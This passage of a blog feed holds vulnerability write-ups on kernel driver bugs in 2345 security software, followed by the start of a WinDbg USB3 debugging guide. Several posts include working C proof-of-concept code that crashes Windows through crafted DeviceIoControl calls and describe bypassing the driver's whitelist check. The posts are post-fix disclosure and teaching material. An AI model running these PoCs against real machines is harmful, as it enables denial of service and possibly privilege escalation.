    
      <category term="CTF" scheme="https://anhkgg.github.io/categories/CTF/"/>
    
    
      <category term="python" scheme="https://anhkgg.github.io/tags/python/"/>
    
      <category term="CTF" scheme="https://anhkgg.github.io/tags/CTF/"/>
    
      <category term="逆向" scheme="https://anhkgg.github.io/tags/%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>2345内核拒绝服务漏洞（3） - WORD的锅</title>
    <link href="https://anhkgg.github.io/vul-2345-3/"/>
    <id>https://anhkgg.github.io/vul-2345-3/</id>
    <published>2018-07-13T04:25:33.000Z</published>
    <updated>2018-07-13T04:26:58.032Z</updated>
    
    <content type="html"><![CDATA[<h1 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h1><ul>
<li>软件网址：<a href="http://safe.2345.cc/" target="_blank" rel="noopener">http://safe.2345.cc/</a></li>
<li>版本：v3.7 X64</li>
</ul>
<p>2345安全软件的驱动2345BdPcSafe.sys在ioctl(0x0022204C)接口处理中，对输入数据校验不严格，精心构造的数据可导致在处理过程中内存拷贝时溢出，然后bsod拒绝服务，甚至可内核提权。</p>
<a id="more"></a>
<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>在<code>IRP_MJ_DEVICE_CONTROL</code>处理函数中，对<code>0x22204C</code>接口进行处理时，有一段拷贝字符串的操作如下所示：</p>
<p><img src="http://wx2.sinaimg.cn/mw690/006mu4nKly1ft5604o35nj30jn04k0so.jpg" alt="img"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">struct _ioctl_buf</span><br><span class="line">&#123;</span><br><span class="line">  WORD len;</span><br><span class="line">  WORD len_;</span><br><span class="line">  DWORD unk2;</span><br><span class="line">  _ioctl_buf_str *ptr;</span><br><span class="line">&#125;;</span><br><span class="line">struct _ioctl_buf_str</span><br><span class="line">&#123;</span><br><span class="line">  wchar_t buf[1];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><code>a2</code>是一个<code>_ioctl_buf</code>结构（由应用层输入构造而成），<code>len2</code>是输入的另一个字符串的长度，通过<code>a2-&gt;len</code>（2字节）和<code>len2</code>（2字节）计算得到<code>len1</code>，关键在于<code>len1</code>是也一个<code>WORD</code>变量，只有2字节，所以当<code>a2-&gt;len+len2</code>的大小超过<code>WORD</code>溢出之后，会被截断成<code>WORD</code>，截断后的值赋给<code>len1</code>，此时就可能导致<code>len1</code>的值反而小于<code>a2-&gt;len</code>。比如：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0xa3d0 + 0xb4f0 = 0x158C0 =&gt;截断=&gt; 0x58C0</span><br><span class="line">0x58C0 &lt; 0xa3d0</span><br></pre></td></tr></table></figure>
<p>接着根据<code>len1</code>分配内存<code>p</code>，<code>memmove</code>拷贝<code>a2-&gt;ptr</code>内容到<code>p</code>中，长度按<code>a2-&gt;len</code>，问题就来了，<code>a2-len</code>大于<code>len1</code>时，就会导致拷贝溢出，<code>bsod</code>（写溢出，可控制内容，可以做更多的利用了，这里我不擅长了）。</p>
<p>好了，漏洞成因这里就分析完了。</p>
<p>下面看一下<code>poc</code>：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">int poc()</span><br><span class="line">&#123;</span><br><span class="line">	</span><br><span class="line">	DWORD BytesReturned = 0;</span><br><span class="line"></span><br><span class="line">	HANDLE h = OpenDevice(&quot;\\\\.\\2345BdPcSafe&quot;);</span><br><span class="line">	if (h == INVALID_HANDLE_VALUE) &#123;</span><br><span class="line">		return 1;</span><br><span class="line">	&#125;</span><br><span class="line">    //过白名单检查</span><br><span class="line">	if (!BypassChk(h)) &#123;</span><br><span class="line">		return 1;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">//BSOD</span><br><span class="line">	DWORD ctlcode = 0x22204C;</span><br><span class="line">#pragma pack(push, 1)</span><br><span class="line">	struct _ioctl_buf_in</span><br><span class="line">	&#123;</span><br><span class="line">		DWORD unk1;</span><br><span class="line">		DWORD unk2;//4</span><br><span class="line">		DWORD offset1;//8 =0x18</span><br><span class="line">		DWORD offset2;//c =A3E8</span><br><span class="line">		DWORD offset3;//10</span><br><span class="line">		DWORD unk3;//14</span><br><span class="line">		char buf1[0xa3d0];//18</span><br><span class="line">		char buf2[0xb4f0];//18+a3d0 </span><br><span class="line">	&#125;; //0x158D8</span><br><span class="line">#pragma pack(pop)</span><br><span class="line"></span><br><span class="line">	_ioctl_buf_in buff = &#123; 0 &#125;;</span><br><span class="line">	buff.unk1 = 4;</span><br><span class="line">	buff.unk3 = 4;</span><br><span class="line">	buff.offset1 = 0x18;</span><br><span class="line">	buff.offset2 = (char*)&amp;buff.buf2 - (char*)&amp;buff;</span><br><span class="line">	buff.offset3 = 0;</span><br><span class="line">	memset(buff.buf1, 0x41, 0xa3d0);</span><br><span class="line">	memset(buff.buf2, 0x41, 0xb4f0);</span><br><span class="line"></span><br><span class="line">	if(!DeviceIoControl(h, ctlcode, &amp;buff, sizeof(_ioctl_buf_in), &amp;buff, 0, &amp;BytesReturned, NULL)) &#123;</span><br><span class="line">		printf(&quot;[-] DeviceIoControl %x error: %d\n&quot;, ctlcode, GetLastError());</span><br><span class="line">	&#125;</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其中<code>buff.buf1</code>和<code>buff.buf2</code>的长度<code>0xa3d0 + 0xb4f0 = 0x158c0</code>（截断）就是<code>a2-&gt;len</code>(<code>0x58c0</code>)，<code>buff.buf2</code>的长度<code>b4f0</code>就是<code>len2</code>。</p>
<p>我们在调试中看一下计算结果，可以清晰看到<code>len1=0xdb2 &lt; 0x58c0(a2-&gt;len)</code>。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">0: kd&gt; p</span><br><span class="line">2345BdPcSafe+0x561c:</span><br><span class="line">fffff880`0540561c 660307          add     ax,word ptr [rdi]</span><br><span class="line">0: kd&gt; r rdi</span><br><span class="line">rdi=fffffa8026539658</span><br><span class="line">0: kd&gt; dw fffffa8026539658 l1</span><br><span class="line">fffffa80`26539658  58c0</span><br><span class="line">//a2-&gt;len = 0x58c0</span><br><span class="line">0: kd&gt; p</span><br><span class="line">2345BdPcSafe+0x561f:</span><br><span class="line">fffff880`0540561f 664103c1        add     ax,r9w</span><br><span class="line">0: kd&gt; r rax</span><br><span class="line">rax=00000000000058c2</span><br><span class="line">//len2 = 0xb4f0</span><br><span class="line">0: kd&gt; r r9</span><br><span class="line">r9=000000000000b4f0</span><br><span class="line">0: kd&gt; p</span><br><span class="line">2345BdPcSafe+0x5623:</span><br><span class="line">fffff880`05405623 0fb7d0          movzx   edx,ax</span><br><span class="line">0: kd&gt; r rax</span><br><span class="line">rax=0000000000000db2</span><br><span class="line">//len1 = 0xdb2</span><br><span class="line">0: kd&gt; p</span><br><span class="line">2345BdPcSafe+0x562a:</span><br><span class="line">fffff880`0540562a ff15b80e0300    call    qword ptr [2345BdPcSafe+0x364e8 (fffff880`054364e8)]</span><br><span class="line">0: kd&gt; dq fffff880`054364e8 l1</span><br><span class="line">fffff880`054364e8  fffff800`03ff70e0</span><br><span class="line">0: kd&gt; u fffff800`03ff70e0</span><br><span class="line">nt!ExAllocatePoolWithTag:</span><br><span class="line">fffff800`03ff70e0 fff5            push    rbp</span><br><span class="line">0: kd&gt; r rcx;r rdx;r r8</span><br><span class="line">rcx=0000000000000001</span><br><span class="line">rdx=0000000000000db2</span><br><span class="line">r8=0000000035343332</span><br><span class="line">//参数：p = ExAllocatePoolWithTag(1, 0xdb2, 0x35343332);</span><br></pre></td></tr></table></figure>
<h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>这个漏洞主要是对输入参数结构体的长度字段校验不够严谨，导致变量溢出截断出现意外的大小结果导致了漏洞的产生。</p>
<p>该系列后续会继续分析其他原因引起的漏洞，如有兴趣，敬请期待！</p>
<p>转载请注明出处：<a href="https://anhkgg.github.io/vul-2345-3/">https://anhkgg.github.io/vul-2345-3/</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;漏洞概述&quot;&gt;&lt;a href=&quot;#漏洞概述&quot; class=&quot;headerlink&quot; title=&quot;漏洞概述&quot;&gt;&lt;/a&gt;漏洞概述&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;软件网址：&lt;a href=&quot;http://safe.2345.cc/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://safe.2345.cc/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;版本：v3.7 X64&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;2345安全软件的驱动2345BdPcSafe.sys在ioctl(0x0022204C)接口处理中，对输入数据校验不严格，精心构造的数据可导致在处理过程中内存拷贝时溢出，然后bsod拒绝服务，甚至可内核提权。&lt;/p&gt;
    
    </summary>
    
      <category term="vul" scheme="https://anhkgg.github.io/categories/vul/"/>
    
    
      <category term="vul" scheme="https://anhkgg.github.io/tags/vul/"/>
    
      <category term="exploit" scheme="https://anhkgg.github.io/tags/exploit/"/>
    
      <category term="fuzz" scheme="https://anhkgg.github.io/tags/fuzz/"/>
    
  </entry>
  
  <entry>
    <title>2345内核拒绝服务漏洞（2）</title>
    <link href="https://anhkgg.github.io/vul-2345-2/"/>
    <id>https://anhkgg.github.io/vul-2345-2/</id>
    <published>2018-07-08T03:15:49.000Z</published>
    <updated>2018-07-08T03:18:23.919Z</updated>
    
    <content type="html"><![CDATA[<h1 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h1><ul>
<li>软件网址：<a href="http://safe.2345.cc/" target="_blank" rel="noopener">http://safe.2345.cc/</a></li>
<li>版本：v3.7 X64</li>
</ul>
<p>2345安全软件的驱动2345BdPcSafe.sys在ioctl(0x002220E4)接口处理中，对输入数据校验不严格，可构造数据中包含非法地址导致访问违例，然后bsod拒绝服务。</p>
<a id="more"></a>
<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>在<code>IRP_MJ_DEVICE_CONTROL</code>处理函数中，对<code>0x2220E4</code>接口进行处理时如下所示：</p>
<p><img src="http://wx1.sinaimg.cn/mw690/006mu4nKly1ft28yb8ym6j30mu03p747.jpg" alt="img"></p>
<p><code>InputBuf</code>是应用层传入的输入缓存内容，校验<code>InputBuf</code>是否为空，长度是否超过8字节，然后通过<code>MmIsAddressValid</code>验证地址是否合法，合法后通过偏移16访问该内存内容是否等于标记<code>li7p</code>。</p>
<p>问题就出在这里，<code>MmIsAddressValid</code>并不能验证一个内存某范围内是否可读可写，仅仅只能验证该地址读写是否会触发一个页错误。</p>
<p>所以我们就可以构造一个可通过<code>MmIsAddressValid</code>验证并且地址16偏移不可读的内存作为输入，造成bsod。</p>
<p>看下面的poc代码，通过<code>VirtualAlloc</code>分配一个页大小的内存，可读可写，然后计算页地址尾地址-4作为输入缓存的ptr，这样<code>MmIsAddressValid</code>可通过校验，再内核读取ptr+16偏移时地址已经超过该页内存范围，不可访问，导致bsod。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">int poc()</span><br><span class="line">&#123;</span><br><span class="line">	</span><br><span class="line">	DWORD BytesReturned = 0;</span><br><span class="line"></span><br><span class="line">	HANDLE h = OpenDevice(&quot;\\\\.\\2345BdPcSafe&quot;);</span><br><span class="line">	if (h == INVALID_HANDLE_VALUE) &#123;</span><br><span class="line">		return 1;</span><br><span class="line">	&#125;</span><br><span class="line">    //过白名单检查</span><br><span class="line">	if (!BypassChk(h)) &#123;</span><br><span class="line">		return 1;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	//BSOD</span><br><span class="line">	DWORD ctlcode = 0x2220E4;</span><br><span class="line">#pragma pack(push,1)</span><br><span class="line">	struct _ioctl_buf_in</span><br><span class="line">	&#123;</span><br><span class="line">		 __int64 ptr;</span><br><span class="line">	&#125;;</span><br><span class="line">#pragma pack(pop)</span><br><span class="line">	_ioctl_buf_in buff = &#123; 0 &#125;;</span><br><span class="line">    </span><br><span class="line">    //分配一个页，可读可写，将该页地址尾地址-4作为输入缓存的ptr</span><br><span class="line">    //然后读取+16偏移时地址已经越过该页内存范围，不可访问，bsod</span><br><span class="line">	PVOID ptr = VirtualAlloc(NULL, 0x1000, MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line">	memset(ptr, 0x41, 0x1000);//</span><br><span class="line">	buff.ptr = (__int64)ptr + 0x1000 - 0x4;</span><br><span class="line"></span><br><span class="line">	if(!DeviceIoControl(h, ctlcode, &amp;buff, sizeof(_ioctl_buf_in), &amp;buff, sizeof(_ioctl_buf_in), &amp;BytesReturned, NULL)) &#123;</span><br><span class="line">		printf(&quot;[-] DeviceIoControl %x error: %d\n&quot;, ctlcode, GetLastError());</span><br><span class="line">	&#125;</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>看看内存更加清晰，<code>buff</code>地址是<code>003efea0</code>，<code>buff.ptr</code>的值是<code>00030ffc</code>，可以清楚看到<code>00030ffc</code>+16偏移处肯定是不可读的了。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">0: kd:x86&gt; dd 003efe3c </span><br><span class="line">00000000`003efe3c  003efe68 75db3237 00000030 002220e4</span><br><span class="line">00000000`003efe4c  003efea0 00000008 003efea0 00000008</span><br><span class="line">0: kd:x86&gt; dd 003efea0 </span><br><span class="line">00000000`003efea0  00030ffc 00000000 01234808 003efef8</span><br><span class="line">0: kd:x86&gt; dd 00030ffc </span><br><span class="line">00000000`00030ffc  41414141 ???????? ???????? ????????</span><br><span class="line">00000000`0003100c  ???????? ???????? ???????? ????????</span><br></pre></td></tr></table></figure>
<h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>这个漏洞算是前一个的延申，依然是应用层传入内容中包括内存地址，也加入了内存合法性验证代码，但是却没什么用，并没有验证到要访问的内存处的合法性，这个疏漏导致了漏洞的产生。</p>
<p>更好的验证内存合法性的函数应该使用<code>ProbeForRead(p, len, x)</code>，可以验证一个范围内内存的合法性，更加严谨，能更好的避免漏洞的产生。</p>
<p>稍微总结一下，应用层传入内容结构越复杂，越容易出现问题。这个漏洞出现的位置，本来应该是2345接口协议验证的代码，是为了增加安全性的，却不想成为了安全性问题的原因。</p>
<p>该系列后续会继续分析其他原因引起的漏洞，如有兴趣，敬请期待！</p>
<p>转载请注明出处：<a href="https://anhkgg.github.io/vul-2345-2/">https://anhkgg.github.io/vul-2345-2/</a></p>
<p><strong>参考</strong></p>
<ol>
<li><a href="https://www.cnblogs.com/Ox9A82/p/5571217.html" target="_blank" rel="noopener">如何验证一个地址可否使用—— MmIsAddressValid函数分析</a></li>
<li><a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/content/ntddk/nf-ntddk-mmisaddressvalid" target="_blank" rel="noopener">https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/content/ntddk/nf-ntddk-mmisaddressvalid</a></li>
</ol>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;漏洞概述&quot;&gt;&lt;a href=&quot;#漏洞概述&quot; class=&quot;headerlink&quot; title=&quot;漏洞概述&quot;&gt;&lt;/a&gt;漏洞概述&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;软件网址：&lt;a href=&quot;http://safe.2345.cc/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://safe.2345.cc/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;版本：v3.7 X64&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;2345安全软件的驱动2345BdPcSafe.sys在ioctl(0x002220E4)接口处理中，对输入数据校验不严格，可构造数据中包含非法地址导致访问违例，然后bsod拒绝服务。&lt;/p&gt;
    
    </summary>
    
      <category term="vul" scheme="https://anhkgg.github.io/categories/vul/"/>
    
    
      <category term="vul" scheme="https://anhkgg.github.io/tags/vul/"/>
    
      <category term="exploit" scheme="https://anhkgg.github.io/tags/exploit/"/>
    
      <category term="fuzz" scheme="https://anhkgg.github.io/tags/fuzz/"/>
    
  </entry>
  
  <entry>
    <title>2345内核拒绝服务漏洞（1）</title>
    <link href="https://anhkgg.github.io/vul-2345-1/"/>
    <id>https://anhkgg.github.io/vul-2345-1/</id>
    <published>2018-07-08T03:15:39.000Z</published>
    <updated>2018-07-08T03:17:28.491Z</updated>
    
    <content type="html"><![CDATA[<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>已经快2个月了吧，已经忘了是什么原因突然搞起了驱动漏洞，反正就是很有兴致地想挖掘一下驱动漏洞。</p>
<p>在网上了解了基本的驱动漏洞挖掘方法，主要是通过ioctl接口进行挖掘，已经有很多相关fuzz工具了，比如<a href="https://github.com/N3mes1s/ioctlbf" target="_blank" rel="noopener">ioctlbf</a>、<a href="https://github.com/k0keoyo/kDriver-Fuzzer" target="_blank" rel="noopener">kDriver-Fuzzer</a>等等。</p>
<p>kDriver-Fuzzer的作者k0keoyo在2017年收获了100多个CVE，很牛逼啊，这个已经2018年了，再来挖此种类型的驱动是不是已经晚了啊，心中苦涩啊。</p>
<p>不过毕竟也写了几年驱动程序了，不搞搞怎么也说不过去啊，所以开始干！</p>
<a id="more"></a>
<p>初学者嘛，还是找软柿子捏捏，什么微软、卡巴、小红伞、360、管家先还是别想了，很巧的知道了2345安全软件（此处想笑，毕竟为我贡献了不少…），先啥也不管，IDA一番…</p>
<p>很不幸的，没多久2345就被我弄翻了，嗯，听说该公司年代也挺久了，咋这么…</p>
<p>经过俩周手工和工具的连番蹂躏，发现2345安全软件驱动共10多个内核拒绝服务漏洞（某些也许可提权），也第一次感受到了拿CVE的感觉（其实怎么感觉都有点waterwater的）…</p>
<p>好，前言胡扯差不多就到这里了，本系列将拿2345中几个典型的原因造成的安全漏洞进行一番分析，希望对和我一样的初学者有一定帮助。</p>
<p>哦，当然，在连番联系2345客服催促之后，2345终于修复了所有漏洞，所以我才等到这个时候分享文章，分析一些细节应该对他们没什么影响了吧（不过，我可没有所有的都重新验证一遍，申明一下，大家不要拿来干坏事，出事了我概不负责！）</p>
<h1 id="漏洞概况"><a href="#漏洞概况" class="headerlink" title="漏洞概况"></a>漏洞概况</h1><ul>
<li>软件网址：<a href="http://safe.2345.cc/" target="_blank" rel="noopener">http://safe.2345.cc/</a></li>
<li>版本：v3.7 X86</li>
</ul>
<p>2345安全软件的驱动2345NetFirewall.sys在ioctl(0x00222014)接口处理中，对输入数据校验不严格，可构造数据中包含非法地址导致访问违例，然后bsod拒绝服务。</p>
<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>在IRP_MJ_DEVICE_CONTROL处理函数中，对0x222014接口进行处理时如下所示：</p>
<p><img src="http://wx2.sinaimg.cn/mw690/006mu4nKly1ft1gtchr61j30cl076jrb.jpg" alt="img"></p>
<p><code>InputBuf</code>是应用层传入的输入缓存内容，校验<code>InputBuf</code>是否为空，长度是否超过8字节，然后在<code>memcpy</code>位置直接取<code>InputBuf</code>第一个字段(0偏移)作为目标地址拷贝内容进去，这里未校验第一个字段值作为内存地址的合法性。</p>
<p>看到这里是不是有什么邪恶的想法了，把该字段置0，那么<code>memcpy(0, xx, xx)</code>不就bsod了。嗯，有点想多了，2345还是受过一些伤害做过一些自我修复的。</p>
<p>看下面，该段代码有异常处理保护，so，0地址bsod不成了（确认该处在3.6版本时被人法克了的，所以补了一下）。</p>
<p><img src="http://wx4.sinaimg.cn/mw690/006mu4nKly1ft1h1f0t5yj30jt05274h.jpg" alt="img"></p>
<p>既然0不行，那么其他地址还是可以的嘛，比如某些内核地址0x80000000，或者nt!HalDispatchTable（某些提权方式使用的地址）。</p>
<p>用下面的poc代码尝试了一下，bsod！</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">ctlcode = 0x222014;</span><br><span class="line">NETFW_IOCTL_222014 buf_222014 = &#123;0&#125;;</span><br><span class="line">buf_222014.size = 1;</span><br><span class="line">buf_222014.ptr = (DWORD*)0x80000000; //非法内核地址</span><br><span class="line">if(!DeviceIoControl(h, ctlcode, &amp;buf_222014, sizeof(NETFW_IOCTL_222014), &amp;buf_222014, sizeof(NETFW_IOCTL_222014), &amp;BytesReturned, NULL)) &#123;</span><br><span class="line">	printf(&quot;[-] DeviceIoControl %x error: %d\n&quot;, ctlcode, GetLastError());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">kd&gt; dd 80000000</span><br><span class="line">80000000  ???????? ???????? ???????? ????????</span><br><span class="line">80000010  ???????? ???????? ???????? ????????</span><br></pre></td></tr></table></figure>
<p>至此，该内核拒绝服务漏洞验证成功，替换未其他内核地址还是有希望提权的，这里不在深入研究。</p>
<h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>看完整篇，其实知道该漏洞真的很明显，很弱B是吧。但是基于某些原因（门槛？漏洞价值？），内核驱动这方面受到的关注较少，所以被虐的少了，开发人员重视程度也不够，所以对于参数的校验上就没那么认真严谨了！所以留下了这种弱X的洞洞被我捡漏。</p>
<p>当然，前面提到2345在3.6版本中已经被人干过，所以还是做了一定的工作的，除了加入了异常保护代码，对于ioctl接口调用也加入了一定的限制和校验。所以poc不是直接就调用接口就成功触发bsod的，而做了一定的前期工作来应对2345做的限制和保护。</p>
<p><strong>这里不是重点，大致讲一下。在IRP_MJ_DEVICE_CONTROL处理函数中，首先会校验调用接口的进程是否在缓存的白名单进程中，但是呢2345又提供了ioctl接口来添加进程到白名单中，对该接口也没做什么其他的校验，所以很随意的调用成功，把自己的poc进程加入了白名单中，然后再调用漏洞接口触发bsod，完成！</strong></p>
<p>另外，如果有兴趣也研究一些驱动此类漏洞的，并且对驱动编程不是很了解的，建议可以先简单学习一下简单驱动编写模板、ring3和ring0通信方式、驱动设备等等内容，推荐可以看看《Windows驱动开发技术详解》相关章节内容。</p>
<p>该系列后续会继续分析其他原因引起的漏洞，如有兴趣，敬请期待！</p>
<p>转载请注明出处：<a href="https://anhkgg.github.io/vul-2345-1/">https://anhkgg.github.io/vul-2345-1/</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;概述&quot;&gt;&lt;a href=&quot;#概述&quot; class=&quot;headerlink&quot; title=&quot;概述&quot;&gt;&lt;/a&gt;概述&lt;/h1&gt;&lt;p&gt;已经快2个月了吧，已经忘了是什么原因突然搞起了驱动漏洞，反正就是很有兴致地想挖掘一下驱动漏洞。&lt;/p&gt;
&lt;p&gt;在网上了解了基本的驱动漏洞挖掘方法，主要是通过ioctl接口进行挖掘，已经有很多相关fuzz工具了，比如&lt;a href=&quot;https://github.com/N3mes1s/ioctlbf&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;ioctlbf&lt;/a&gt;、&lt;a href=&quot;https://github.com/k0keoyo/kDriver-Fuzzer&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;kDriver-Fuzzer&lt;/a&gt;等等。&lt;/p&gt;
&lt;p&gt;kDriver-Fuzzer的作者k0keoyo在2017年收获了100多个CVE，很牛逼啊，这个已经2018年了，再来挖此种类型的驱动是不是已经晚了啊，心中苦涩啊。&lt;/p&gt;
&lt;p&gt;不过毕竟也写了几年驱动程序了，不搞搞怎么也说不过去啊，所以开始干！&lt;/p&gt;
    
    </summary>
    
      <category term="vul" scheme="https://anhkgg.github.io/categories/vul/"/>
    
    
      <category term="vul" scheme="https://anhkgg.github.io/tags/vul/"/>
    
      <category term="exploit" scheme="https://anhkgg.github.io/tags/exploit/"/>
    
      <category term="fuzz" scheme="https://anhkgg.github.io/tags/fuzz/"/>
    
  </entry>
  
  <entry>
    <title>Windbg USB3.0双机调试</title>
    <link href="https://anhkgg.github.io/windbg-usb3-dbg-win10/"/>
    <id>https://anhkgg.github.io/windbg-usb3-dbg-win10/</id>
    <published>2018-03-23T06:31:36.000Z</published>
    <updated>2018-03-23T06:55:19.751Z</updated>
    
    <content type="html"><![CDATA[<h1 id="配置需求"><a href="#配置需求" class="headerlink" title="配置需求"></a>配置需求</h1><p>1.目标主机有USB3.0 xHCI主机控制器，支持调试<br>2.host主机支持USB3.0 xHCI主机控制器(使用UsbView查看)<br>3.USB 3.0 调试线(<a href="https://www.datapro.net/products/usb-3-0-super-speed-a-a-debugging-cable.html" target="_blank" rel="noopener">国外购买地址</a>（可以用普通USB3.0 公对公线改造，剪掉红绿百三根线）</p>
<blockquote>
<p>先从淘宝买一根USB 3的A对A连线，有时也称公对公连线，很便宜。这根线需要加工一下才可以支持调试，加工的方法是选取线的某个位置，剥开外皮，然后把其中的红绿白三根线剪断，然后包上就可以了。USB 3电缆的线是有固定颜色的，如图3所示，<br>其中SDP是Shielded Differential Pair的缩写，即屏蔽起来的差分信号线，是USB 3.0的数据线，UTP是Unshielded Twisted Pair的缩写，即未屏蔽的双绞线，是USB1/2使用的数据线，所谓的D+，D-。要做的加工其实就是把2.0的三根弦剪断。剥开后，很容易找到红绿白三根，胆大心细，下剪子吧:-)。</p>
</blockquote>
<p>4.两台主机系统必须是Win8以上</p>
<blockquote>
<p>On the host computer, an xHCI (USB 3.0) host controller<br>On the target computer, an xHCI (USB 3.0) host controller that supports debugging</p>
</blockquote>
<a id="more"></a>
<h1 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h1><p><strong>在目标主机配置调试模式。</strong></p>
<p>命令：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">bcdedit /debug on</span><br><span class="line">bcdedit /dbgsettings usb targetname:TargetName</span><br><span class="line">//如果目标主机有多个xHCI主机控制器，则需要配置需要使用的，b.d.f在usbview中可以看到</span><br><span class="line">bcdedit /set &quot;&#123;dbgsettings&#125;&quot; busparams b.d.f</span><br><span class="line">//重启主机</span><br></pre></td></tr></table></figure>
<p>使用msconfig配置，引导，高级模式，勾选调试，选择USB模式，USB目标名：usbdbg</p>
<p><strong>host主机配置。</strong></p>
<p>第一次配置，如果host是X64，开启X64 windbg，如果是x86，选择开启x86 windbg，需要管理员权限运行。</p>
